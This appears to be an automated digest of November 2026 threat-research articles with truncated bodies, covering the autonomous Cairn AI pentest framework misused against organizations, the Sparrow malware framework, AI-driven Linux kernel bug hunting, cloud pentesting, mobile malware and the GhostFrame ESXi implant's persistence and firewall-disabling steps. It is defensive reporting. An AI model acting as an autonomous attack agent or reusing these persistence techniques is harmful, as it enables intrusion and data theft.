- Title: Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors
- Source: Unit 42 (threat_research_primary)
- Published: 2026-11-12T15:00:31+00:00
- Link: https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: government, manufacturing_industrial
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government, manufacturing_industrial
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Summary

```
Our analysis of how attackers used the open-source Cairn AI agent framework to autonomously breach semiconductor, defense and civic targets. The post Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors 8 min read Related Products Advanced IP Defense Advanced URL Filtering Cloud-Delivered Security Services Cortex Cortex Agentic Endpoint Security Cortex XDR Cortex XSIAM Idira Unit 42 AI Security Assessment Unit 42 Continuous Frontier AI Defense Unit 42 Deep and Dark Web Service Unit 42 Incident Response Unit 42 Threat Intelligence Services By: Unit 42 Published: November 12, 2026 Categories: Malware Threat Research Tags: API DeepSeek Exploits Guardrails Penetration testing Privilege escalation VPN Share Executive Summary From August–September 2026, Chinese-speaking attackers used an open-source AI penetration testing framework called Cairn to autonomously conduct 25 operations against at least 19 organizations. The attackers weaponized Cairn by pairing it with Chinese AI models Zhipu GLM and DeepSeek. The attackers supplied a target and a goal, then Cairn planned, executed and recorded results on its own. These attacks achieved unauthorized access or data retrieval at 10 of the targeted organizations, including: Accessing dozens of valid credentials Mass exposing personal data (exceeding one million records at one organization) Retrieving military and government identities Creating persistent administrator accounts in a production system Modifying a live industry standards-ballot document We assess with moderate confidence that this activity represents China-nexus intelligence collection, which we currently track as CL-STA-1238. This article details how attackers used Cairn to target three key sectors: Advanced semiconductor manufacturing U.S. defense policy Civil society Palo Alto Networks customers are better protected from the threats discussed above through the following products and services: Advanced URL Filtering and Advanced IP Defense Cortex XDR and XSIAM Cortex Agentic Endpoint Security Idira Identity and Access Management (IAM) Idira Privileged Access Management (PAM) The Unit 42 AI Security Assessment can help identify and mitigate complex AI-enabled risks. Unit 42 Continuous Frontier AI Defense is an offensive security service designed to assist organizations with continuously discovering hidden and unknown exposures in dynamic environments, validate real-world exploitability across attack paths through agentic testing and expert analysis, and provide prioritized remediation and virtual patching guidance to accelerate risk mitigation. Organizations can access tailored adversary intelligence, direct analyst consultations and specialized exposure tracking through Unit 42 Threat Intel Services and its Deep and Dark Web Service . If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics AI , Agentic AI , Supply Chain Technical Analysis Cairn Framework The attackers behind CL-STA-1238 orchestrated their campaign using the publicly available penetration testing framework Cairn . An AI model drives each Cairn “agent worker.” Cairn coordinates its activities through a shared “blackboard.” Agents read the blackboard and write their findings back as a fact-intent graph, while human operators can inject “hints” at any time to help guide the operations if needed. Confirmed findings accumulate as immutable facts and the agent queues its next actions as intents. Attackers ran a customized fork of Cairn from a server hosted in Hong Kong ( 154.44.31[.]4 , AS979, NetLab Global) and hosted an attack egress and staging node in the U.S. ( 82.29.129[.]54 , AS142036, Hosteons Pte. Ltd.). Figure 1 below shows a screenshot of the controller login page of the attackers' Cairn framework. Figure 1. Attacker-operated Cairn login page. For each operation, the attackers created a task with a one-line goal, such as: 以拿到实质性高价值权限为止，包括但不限于webshell、ssh、源码、key、用户信息、凭据等，最好是可以进入内网 Translation: "Obtain substantive high-value access,
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors
  - Published: 2026-11-12T15:00:31+00:00
  - Link: https://unit42.paloaltonetworks.com/cairn-framework-ai-autonomous-attacks/
  - Summary: Our analysis of how attackers used the open-source Cairn AI agent framework to autonomously breach semiconductor, defense and civic targets. The post Attackers Use Autonomous AI to Target Semiconductor, Defense and Civil Society Sectors appeared first on Unit 42 .

### Cluster 877727aec7 — score 16

- Title: Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe
- Source: Check Point Research (threat_research_primary)
- Published: 2026-11-10T14:01:14+00:00
- Link: https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, ransomware_extortion, web_shell_backdoor
- affected_industries: critical_infrastructure, financial_services, government, telecommunications
- affected_products: Android, OpenAI/ChatGPT
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage, web_shell_backdoor
- affected_industries: financial_services, government, critical_infrastructure, telecommunications
- affected_products: Android, OpenAI/ChatGPT
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Summary

```
Key Points Introduction Over the past year, Check Point Research investigated a series of intrusion campaigns targeting several dozens of high-profile organizations across Latin America, Asia, and Europe. These campaigns initially appeared to be independent operations, each using different backdoors, post-exploitation tools and operational pace. However, we identified numerous connections between the tools and their […] The post Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 23 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 482 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 433 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe November 10, 2026 https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/ Key Points During a year-long investigation, Check Point Research identified three distinct operational clusters spanning Latin America, Asia, and Europe targeting telecommunications providers, government organizations, military entities, research institutions, and critical infrastructure. The clusters , SilentDelivery, OceanGate and DarkWire , are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework. We track the entity behind the Sparrow framework as CopperDragon , a potential digital quartermaster supporting China-nexus threat actors, including FamousSparrow , Earth Estries , TropicTrooper , UAT-9244 , and others. Each cluster employed a different toolset and different initial access techniques, including compromising internet-facing infrastructure and highly selective watering-hole attacks. The compromised websites that were used for watering hole attacks were of government, shipping, and IT and research sectors. Our research uncovered several previously undocumented tools and new details about the Sparrow framework, including Windows and Linux variants, passive backdoor capabilities , and a connection to the Melofee backdoor. Introduction Over the past year, Check Point Research investigated a series of intrusion campaigns targeting several dozens of high-profile organizations across Latin America, Asia, and Europe. These campaigns initially appeared to be independent operations, each using different backdoors, post-exploitation tools and operational pace. However, we identified numerous connections between the tools and their infrastructure which linked them to the same Sparrow malware ecosystem. We track the entity behind these campaigns as CopperDragon , which may serve as a digital quartermaster supporting a number of China-nexus threat actors that use the Sparrow cross-platform malware framework for Linux and Windows. What is CopperDragon? FamousSparrow is a threat actor that was first identified in 2021, whose main backdoor is SparrowDoor . Since then, multiple vendors have reported on related activity and malware variants, including CrowDoor , HemiGate , and TernDoor . Over time, it became apparent that this other activity was not necessarily carried out by the original FamousSparrow group. Instead, reporting pointed to several distinct actors using a shared toolset, potentially supplied by the same entity. These actors include FamousSparrow , Earth Estries , TropicTrooper , UAT-9244 , and others. FamousSparrow was previously also linked to Salt Typhoon, but the relationship details remain unclear. Based on the apparent tool-sharing, we began tracking the entity behind the Sparrow framework as CopperDragon , its possible developer and supplier. In this report, we examine three distinct activity clusters targeting major telecommunications providers , government organizations , and military entities . Together, these operations provide a broader view of the connected and evolving espionage ecosystem linked to CopperDragon : SilentDelivery uses highly selective watering-hole attacks that distribute the SquadC backdoor through Trojanized MSI installers masquerading as certificate repair utilities. This cluster focuses on Europe and Asia regions. OceanGate focuses primarily on Asian organizations and uses a variant of SparrowDoor . The actor first com
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe
  - Published: 2026-11-10T14:01:14+00:00
  - Link: https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/
  - Summary: Key Points Introduction Over the past year, Check Point Research investigated a series of intrusion campaigns targeting several dozens of high-profile organizations across Latin America, Asia, and Europe. These campaigns initially appeared to be independent operations, each using different backdoors, post-exploitation tools and operational pace. However, we identified numerous connections between the tools and their […] The post Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe appeared first on Check Point Research .

### Cluster eb92172155 — score 16

- Title: [tl;dr sec] #354 - ARTEX & Agentic Hacking in the Wild, The Patchless Window, Backporting Security Fixes
- Source: tl;dr sec (practitioner_analysis)
- Published: 2026-11-12T15:30:00+00:00
- Link: https://tldrsec.com/p/tldr-sec-354
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_industries: healthcare, manufacturing_industrial
- affected_products: Linux kernel, OpenAI/ChatGPT
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_industries: healthcare, manufacturing_industrial
- affected_products: OpenAI/ChatGPT, Linux kernel
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
ARTEX be hacking errybody up in here, the critical gap between when a patch is public and defenders respond, and how stable releases may be missing many patches
```

#### Full body

```
0 tl;dr sec Posts [tl;dr sec] #354 - ARTEX & Agentic Hacking in the Wild, The Patchless Window, Backporting Security Fixes [tl;dr sec] #354 - ARTEX & Agentic Hacking in the Wild, The Patchless Window, Backporting Security Fixes ARTEX be hacking errybody up in here, the critical gap between when a patch is public and defenders respond, and how stable releases may be missing many patches Clint Gibler November 12, 2026 Hey there, I hope you’ve been doing well! 🤗 Family Movie Time I have some fun Halloween anecdotes but I haven’t had time to write them up yet so I’ll save them for next week. Instead, I’ll quickly reflect on this wholesome meme I saw recently: It reminds me of a very fond memory I have of when I was a wee lad, say 6 or under, about how my parents and I would watch movies together. My dad would sit on one side of the couch and extend his legs down the rest of the couch, then my mom would sit on top of him and do the same, and then I’d sit on her and do the same, like we were a bunch of matryoshka Russian nesting dolls. It was very comforting. There’s something nice about that closeness and familiarity. A part of me is wistful that this isn’t as much a thing when you’re older. I guess you get to live it again for a time, when you have kids. Feel free to share a sweet memory you had with your parents as a kid, or that you have with your kid(s) now 🙂 Sponsor 🚨 65% of threat intel teams say noise is their #1 problem (Sponsor) Alert noise and false positives were the most common challenge (65%) among surveyed enterprise intel leaders in Flashpoint’s 2026 Enterprise Threat Intelligence Report, followed by analyst bandwidth (55%). As one healthcare leader put it, “we can’t hire our way out of that problem.” Flashpoint Ignite force-multiplies the team you already have, turning noisy alerts into actionable defenses. Tour the platform to discover how Ignite supports faster investigation and decision-making through advanced search, customized alerts, finished intelligence, dashboards, analyst support, and integrated AI. 👉 Tour the Flashpoint platform 👈 Agreed, focusing on the signal of what matters is key 👌 AppSec The Vulnpocalypse - Good News and Bad News Phil Venables examines the "vulnapocalypse" challenge where AI-driven vulnerability discovery is creating massive triage workloads, but argues the real bottleneck isn't finding or fixing vulnerabilities in code, it's deploying those fixes across diverse, complex infrastructures including edge devices, medical equipment, and industrial systems. He breaks down vulnerability remediation into four stages (discovery, fix development, testing/staging, deployment) and notes that while AI accelerates stages 1-2, stage 4 deployment often consumes 60% of effort due to certification requirements, infrastructure complexity, and reliability risks. Phil proposes solutions including policy intent systems that auto-enforce configurations, AI-driven compensating controls that adjust WAFs/firewalls based on vulnerability context, patch intelligence to predict breaking changes, and faster rollback capabilities with incremental deployment percentages (5% → 20% → … 100%) to catch issues earlier. 💡 Fantastic blog as always from Phil. I like the style of the intro bullets, alternating “the good news is” and “the bad news is.” I’ve also been finding that the vulnerability fix deployment is a big percent of the effort and problem. Great discussion of the challenges and opportunity at each vulnerability remediation stage. Backporting security fixes to stable releases Trail of Bits’ Artem Dinaburg calls attention to the challenge of actually getting fixes to users, as stable releases (e.g. Ubuntu Long Term Support) often contain thousands of known, unfixed CVEs that AI agents can easily exploit. Using Codex with GPT-5.6, Trail of Bits identified and backported security fixes to stable Linux kernel branches and distributions, successfully getting 142 fixes representing 90 CVEs applied to stable kernel
```

#### Corroborating sources (1)

- **tl;dr sec** (practitioner_analysis)
  - Title: [tl;dr sec] #354 - ARTEX & Agentic Hacking in the Wild, The Patchless Window, Backporting Security Fixes
  - Published: 2026-11-12T15:30:00+00:00
  - Link: https://tldrsec.com/p/tldr-sec-354
  - Summary: ARTEX be hacking errybody up in here, the critical gap between when a patch is public and defenders respond, and how stable releases may be missing many patches

### Cluster fba6e81cad — score 16

- Title: Lessons from 59 Linux Kernel Bug Reports
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-11-11T16:55:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/11/11/lessons-from-59-linux-kernel-bug-reports/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Linux kernel

#### Cluster taxonomy (union across members)
- affected_products: Linux kernel, Microsoft Defender
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- affected_products: Linux kernel, Microsoft Defender
- urgency_signals: poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Microsoft FORGE Lab researchers used codename MDASH to investigate Linux kernel vulnerabilities, resulting in 59 upstream bug reports, 33 assigned CVEs, and 38 merged fixes. The research includes eight demonstrated local root privilege-escalation exploits and examines the challenges of turning AI-generated findings into validated vulnerabilities and upstream fixes. The post Lessons from 59 Linux Kernel Bug Reports appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Frontier AI models Linux Threats intelligence Vulnerabilities and exploits Content types Research Products and services Microsoft Defender Topics Actionable threat insights AI and agents At Microsoft’s FORGE Lab , we used codename MDASH to scan a subset of Linux kernel subsystems from late May to mid-June 2026. One full-time researcher and one intern led this three-month effort, which has so far produced 59 public upstream reports and 33 assigned CVEs . We confirmed working root privilege-escalation exploits for eight of those CVEs, and fixes for 38 of our reports have been merged into mainline. Finding the bugs was only part of the work. The initial scans produced 26,502 raw findings in about two weeks, but turning those results into reproducible bugs, upstream reports, and patches took months of expert investigation and collaboration with Linux maintainers. In this post, we look back at how we went from thousands of potential findings to validated vulnerabilities and upstream fixes, and what we learned about scaling vulnerability discovery with AI. From scans to reports We focused on several core kernel subsystems, such as networking, filesystems, and security modules. Our selection criteria were straightforward: we picked security-sensitive components with no obvious dependence on specialized hardware, making QEMU-based validation simple and unified. Code scanning mainly used Sonnet 4.6 (71.1% of code-scanning tokens), GPT-5.4 (20.1%), and GPT-5.5 (7.1%). The codename MDASH scans produced 26,502 raw scan findings in about two weeks on two servers (64 cores/256 GB RAM and 32 cores/128 GB RAM), but turning that output into patches and reports took months of expert work. We filtered out low-confidence claims using codename MDASH’s confidence levels and separate fast screening agents we built, reducing the pool to 11,769 candidates. PoC-generating agents then attempted reproduction in QEMU, mainly using GPT-5.5 (77.3% of reproduction tokens), Opus 4.6 (13.2%), and GPT-5.5-cyber (9.4%). Experts then reviewed the 621 cases with PoC evidence to identify root causes, merge duplicates, and prepare upstream submissions. Figure 1 . Scan-to-report workflow. 26,502 raw findings → 11,769 screened candidates → 621 PoC-backed cases → 59 upstream reports. Where the 621 cases went Roughly one public upstream report landed from every ten PoC-backed cases: 59 reports from 621 cases (9.5%). Across those cases, the main reasons for not filing a separate new report were: 266 (42.8%) shared a root cause with another case, so one patch could fix them together. 163 (26.2%) were not reported after review, mostly due to limited security impact. 133 (21.4%) were already reported or fixed upstream. Submission timing explains many of the 133 overlaps. Most of the 621 cases were new when the scans finished (though some may already have been in flight by others). Our first public report went out on June 27, 2026, more than five weeks after scanning started. By September 1, 55 of the 59 had been posted to the public lists; the other four were reported privately during the same window and routed to the public lists by mid-October. Getting fixes merged Upstream Linux typically requires vulnerability reports to come with a working patch. Agents helped draft initial fixes, but human validation, subsystem understanding, and iterating with maintainers during review remained essential. So far, fixes for 38 of our reports have been merged into upstream mainline—half on the first submission, and the rest after one to four revisions. Reaching a mainline release from the first public patch took a median of 41 days (up to 108 days), and we are still working with maintainers on the remaining reports. How old the bugs were Interestingly, most of the bugs we reported had been in the kernel for years. Across the 59 reports, the average bug was 8.1 years old when we first reported it publicly. One of the oldest, a cls_u32 shift-out-of-bo
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Lessons from 59 Linux Kernel Bug Reports
  - Published: 2026-11-11T16:55:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/11/11/lessons-from-59-linux-kernel-bug-reports/
  - Summary: Microsoft FORGE Lab researchers used codename MDASH to investigate Linux kernel vulnerabilities, resulting in 59 upstream bug reports, 33 assigned CVEs, and 38 merged fixes. The research includes eight demonstrated local root privilege-escalation exploits and examines the challenges of turning AI-generated findings into validated vulnerabilities and upstream fixes. The post Lessons from 59 Linux Kernel Bug Reports appeared first on Microsoft Security Blog .
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ThreatsDay: 59 Linux Kernel Bugs, Falcon Spyware, GSocket Backdoors + 17 More Stories
  - Published: 2026-11-12T18:02:51+00:00
  - Link: https://thehackernews.com/2026/11/threatsday-59-linux-kernel-bugs-falcon.html
  - Summary: A search result isn't always safe. An access request isn't always harmless. And a familiar account doesn't always mean a familiar person is using it. Simple things to remember. Yet a surprising amount of this week's trouble starts right there. Attackers are using fake websites, stolen access, and trusted tools to get into places they shouldn't be. AI is helping them build attacks faster, while

### Cluster 5d95fceb7e — score 16

- Title: Transcending the trust boundaries: how a cloud pentest works
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-11-12T10:00:53+00:00
- Link: https://securelist.com/how-a-cloud-pentest-works/121921/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Kubernetes

#### Cluster taxonomy (union across members)
- affected_products: Kubernetes
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_2_operator

#### Primary article taxonomy
- affected_products: Kubernetes
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
This is the first article in a series on cloud penetration testing. We'll cover the three cloud layers (External, Overlay, and Underlay), common architectures (OpenStack and Kubernetes), typical attack chains, and real-world incidents.
```

#### Full body

```
Content menu Close Subscribe Threat Response Table of Contents Key points Key terms What a pentester needs to check Cloud platform as a research target The hotel analogy and the three cloud layers Where the trust boundaries lie Attacker model and three research goals 1. Code execution first 2. Credentials first 3. Administrative or service context Sorting out the architectural zoo OpenStack-like infrastructure Kubernetes-based platforms Custom control plane and configuration management systems Mixed-stack platform How to choose the next trust boundary Typical attack chains and real-world incidents 1. From a managed database to other users’ data 2. From a Kubernetes pod to other users’ data 3. From a public operation to changes in internal cloud resources 4. Virtual machine escape What counts as a pentest result Safe confirmation of impact Conclusion What’s in the next article Authors Matvey Bukhtoyarov Denis Stepanov Kaspersky Security Services Users trust a cloud provider to configure and maintain their IT services, including data storage. In turn, the provider guarantees that hosted services will stay up and that data will remain strictly confidential. To demonstrate that their platforms are secure, providers choose different strategies: some run bug bounty programs, some rely on regular internal audits, and some bring in external research teams. However, cloud pentest methodology still has plenty of blind spots: there’s no single standard, and the outcome depends on the experience and skill of the team. Most pentests in this area have historically focused on the external layer: the management console, customer interfaces, APIs, and the basic network perimeter. This layer is important, but it’s only the surface. In this introductory article, we share our approach to penetration testing of cloud environments, which we’ve developed over several years and dozens of projects. We don’t claim to cover every possible scenario. Instead, we want to show the reasoning behind our pentests and highlight less obvious points that are easy to miss. Key points Cloud infrastructure is more complex than a traditional web application. To simplify, you can think of it as a hotel with three zones: the booking website (External, the outermost layer), the guest rooms (Overlay, the logical layer), and the staff area (Underlay, the infrastructure or base layer). A cloud service is well protected if the trust boundaries between these zones cannot be breached. A cloud pentest’s value isn’t measured by the number of vulnerabilities found or by the mere fact that code ran. Remote command execution in an isolated tenant container is only the beginning of a pentest, not the end. The main goal is to assess whether an attacker can violate trust boundaries. The assessment should answer five critical questions: Can an attacker read, modify, or delete other tenants’ data? Can they take over the provider’s IAM service account? Does compromising a runtime environment lead to the attack spreading to other resources and services? Can the provider’s internal resources be affected from low-trust segments? Is a virtual environment escape possible? A negative result is still a result. If a pentester cannot move from the tenant plane to the provider overlay, that is a valuable finding. It shows which protection boundaries work in practice and which rely only on assumptions and need additional controls. However, it does not prove that the trust boundary is impossible to cross or that no other attack paths exist. Key terms Below, we explain some specific terms that are most often used in cloud infrastructures. Show definitions Tenant (think of a renter in an apartment building) is a logically isolated unit within a cloud platform. Examples include a user (such as an organization), a separate project or cloud account, or another unit of administrative and resource isolation. Tenant plane is the set of IT services and data that a tenant manages directly: virtual machines,
```

#### Corroborating sources (2)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Transcending the trust boundaries: how a cloud pentest works
  - Published: 2026-11-12T10:00:53+00:00
  - Link: https://securelist.com/how-a-cloud-pentest-works/121921/
  - Summary: This is the first article in a series on cloud penetration testing. We'll cover the three cloud layers (External, Overlay, and Underlay), common architectures (OpenStack and Kubernetes), typical attack chains, and real-world incidents.
- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: The open AI-native stack on Kubernetes: From open models to distributed inference and agents
  - Published: 2026-11-10T01:00:00+00:00
  - Link: https://cloud.google.com/blog/topics/developers-practitioners/the-open-ai-native-stack-on-kubernetes-from-open-models-to-distributed-inference-and-agents/
  - Summary: Over the past decade, Kubernetes established itself as the standard for orchestrating microservices and containerized applications. Today, we're witnessing the next major architectural shift in distributed computing: AI workloads moving from isolated research prototypes into large-scale, multi-tenant production fleets . In this post, we'll walk through the open-source stack that powers this shift and show you the sample manifests that you can try on your own Kubernetes clusters. You can also join us at KubeCon + CloudNativeCon North America 2026 to see these projects in action through live demos and technical sessions. For modern engineering teams, production AI is rapidly moving beyond generic calls to closed, black-box APIs. Organizations are realizing that their long-term competitive advantage lies in domain specialization. Platform engineers, ML researchers, and AI builders want the autonomy to run high-performing open-weight models (such as the Gemma family). They want to adapt th

### Cluster 7cc91e5ade — score 16

- Title: IT threat evolution in Q3 2026. Mobile statistics
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-11-10T08:00:17+00:00
- Link: https://securelist.com/malware-report-q3-2026-mobile-statistics/121844/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Android

#### Cluster taxonomy (union across members)
- affected_industries: financial_services
- affected_products: Android
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- affected_industries: financial_services
- affected_products: Android
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Q3 2026 mobile threat statistics for Android malware, adware, and unwanted software, plus the most notable malware found during the quarter.
```

#### Full body

```
Content menu Close Subscribe Threat Response Table of Contents The quarter in figures Quarterly highlights Mobile threat statistics TOP 20 types of mobile malware Mobile banking Trojans TOP 10 mobile bankers Authors Anton Kivva IT threat evolution in Q3 2026. Non-mobile statistics IT threat evolution in Q3 2026. Mobile statistics The mobile section of the quarterly cyberthreat report includes statistics on malware, adware, and potentially unwanted software for Android, as well as descriptions of the most notable threats for Android and iOS discovered during the reporting period. These statistics are based on detection alerts from Kaspersky products, collected from users who consented to provide statistical data to Kaspersky Security Network. The quarter in figures According to Kaspersky Security Network, in Q3 2026: More than 1.66 million attacks involving mobile malware, adware, or unwanted software were blocked. The Trojan-Banker category was the prevalent mobile malware threat with a 31.63% share of all detected malicious apps. Over 378,000 malicious installation packages were detected, including 119,688 mobile banking Trojan packages. Quarterly highlights In July, we discovered a malicious app targeting Brazilian users that may have used AI to automate fraud. The app was disguised as Google Play Protect, a suite of security services for Android devices. Malicious app imitating Google Play Protect The app’s code used the DistilBERT model to interpret natural-language commands sent from the C2 server. Traces left in the code suggest the server-side commands may also have been generated by a large language model (LLM). In August, we discovered a Trojan that analyzed images saved in the device’s gallery and took screenshots to look for banking data, including CVV codes. The malware used an on-device AI model to classify images. The app could also update this model, which gave the scammers a way to expand the Trojan’s functionality. In the third quarter, the infamous subscription Trojan detected as Trojan.AndroidOS.Subscriber.bh made it into Google Play again. This time, it was disguised as an app for creating keyboard themes. Subscription Trojan disguised as a keyboard theme app The Trojan opened a subscription link in a hidden WebView and intercepted the message containing the confirmation code. According to our data, the scammers mainly targeted users in Thailand. There were also new attacks on iOS users. In August, researchers at Socket discovered 13 infected PHP packages in the Packagist repository. The malicious payload injected links to fraudulent casinos into sites that used these packages and, on iOS devices only, a hidden iframe that loaded the DarkSword exploit kit. The attack delivered a spyware module that stole keychain contents, Wi-Fi passwords, SMS messages, photos, and other personal data. Other modules found in this campaign were used to steal crypto wallet data and the seed phrases used to recover them. SlowMist researchers found the same DarkSword exploit chain used in a fake app, FomoPeek. FomoPeek was published in the App Store, presenting itself as a crypto wallet tracker. The malware was designed to steal data from notes and crypto wallet apps. Also in August, we discovered infected versions of popular iOS apps distributed through Telegram (link in Russian). To install such an app, the attackers asked users to buy a developer certificate. The modified versions contained a malicious module that collected device information, took screenshots, and sent this data to a server. Mobile threat statistics The downward trend in attacks on mobile devices involving malware, adware, or unwanted software continued: the number fell to 1,668,368 in Q3 from 1,996,823 in Q2. Attacks on users of Kaspersky mobile solutions, Q1 2025 – Q3 2026 ( download ) In the third quarter, this decline was driven in part by fewer adware attacks, which we examine in more detail below. The number of Android malware samples grew compared to
```

#### Corroborating sources (2)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: IT threat evolution in Q3 2026. Mobile statistics
  - Published: 2026-11-10T08:00:17+00:00
  - Link: https://securelist.com/malware-report-q3-2026-mobile-statistics/121844/
  - Summary: Q3 2026 mobile threat statistics for Android malware, adware, and unwanted software, plus the most notable malware found during the quarter.
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: ArcticRAT Cybercrime Gang Profiles Victim Finances With AI
  - Published: 2026-11-13T20:20:27+00:00
  - Link: https://www.darkreading.com/mobile-security/arcticrat-cybercrime-gang-profiles-victim-finances-ai
  - Summary: The Android malware has expanded from focusing on crypto theft to full device control, and the attackers have added advanced analysis of stolen information.

### Cluster 269bffa279 — score 16

- Title: GhostFrame: A new ESXi Implant Linked to Settra Ransomware
- Source: Recorded Future (threat_research_primary)
- Published: 2026-11-10T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/ghostframe-esxi-implant-settra-ransomware
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: VMware

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- affected_products: VMware
- content_type: news_report
- confidence_tier: tier_1_primary_research, tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- affected_products: VMware
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
GhostFrame is a new post-exploitation framework targeting VMware ESXi environments, linked to TAG-218 and Settra ransomware.
```

#### Full body

```
GhostFrame: A New ESXi Implant Linked to Settra Ransomware Summary GhostFrame is a previously undocumented post-exploitation framework that gives threat actors extensive control over compromised VMware ESXi environments. Once an attacker gains root-level access to an ESXi host, GhostFrame provides a single interface to access virtual machines running on the hypervisor, harvest credentials, execute commands, and pivot deeper into victim networks. Insikt Group identified GhostFrame being used by TAG-218, a threat activity group whose operations overlap with Settra ransomware. GhostFrame is notable because it allows threat actors to operate from the virtualization layer, where a single compromised ESXi host can provide access to multiple virtual machines and the systems and data they contain. Insikt Group’s findings demonstrate how attackers can use compromised hypervisors as a centralized platform for post-exploitation activity, potentially expanding access across victim environments without compromising each virtual machine individually. The discovery highlights the importance of treating virtualization infrastructure as a high-value target and monitoring ESXi hosts for signs of unauthorized access and post-exploitation activity. A New ESXi Post-Exploitation Framework Insikt Group identified GhostFrame, a command-and-control (C2) and post-exploitation framework designed to operate on compromised VMware ESXi hypervisors. GhostFrame provides threat actors with a centralized interface to maintain access to ESXi hosts, execute commands, manage virtual machines (VMs), pivot through internal networks, and harvest credentials from Windows systems hosted on the hypervisor. One notable feature is GhostFrame’s ability to operate from the virtualization layer. A single ESXi host can support multiple VMs running critical services within an organization. GhostFrame allows operators with root privileges on the hypervisor to interact with multiple hosted systems from a single point of access instead of requiring separate access to each guest system. Analysis of GhostFrame’s recovered frontend files revealed a web-based operator panel containing two primary sections: “Sessions” and “Builder.” The builder generates an ESXi implant, while the sessions interface allows operators to monitor connected systems and access the framework’s post-exploitation capabilities. Figure 1: Reconstruction of the GhostFrame C2 panel based on recovered frontend source code (Source: Recorded Future) Implant Deployment and Persistence GhostFrame includes an integrated builder that generates an ESXi implant named vmhostd-core . The interface provides operators with deployment instructions, including compiling the binary, manually disabling the ESXi firewall, and executing the implant from a datastore. Operators must already have root-level access to the ESXi host to deploy and execute the implant, as the implant does not exploit a vulnerability to gain access. Analysis of a recovered GhostFrame Executable and Linkable Format (ELF) sample revealed that the implant establishes persistence by copying itself to /opt/vmhostd-core and modifying the ESXi boot script /etc/rc.local.d/local.sh . The modified script executes the implant and repeatedly disables the ESXi firewall and the execInstalledOnly security control, which restricts the execution of unsigned binaries. These commands run approximately every five seconds, allowing the implant to disable the controls again if an administrator attempts to restore them. The implant also executes /sbin/auto-backup.sh to preserve the modified configuration across reboots. To blend into the ESXi environment, the implant appears as vmhostd , a name that resembles VMware’s legitimate vmware-hostd daemon, by modifying its process name and command-line representation. C2 Communications and Payload Execution 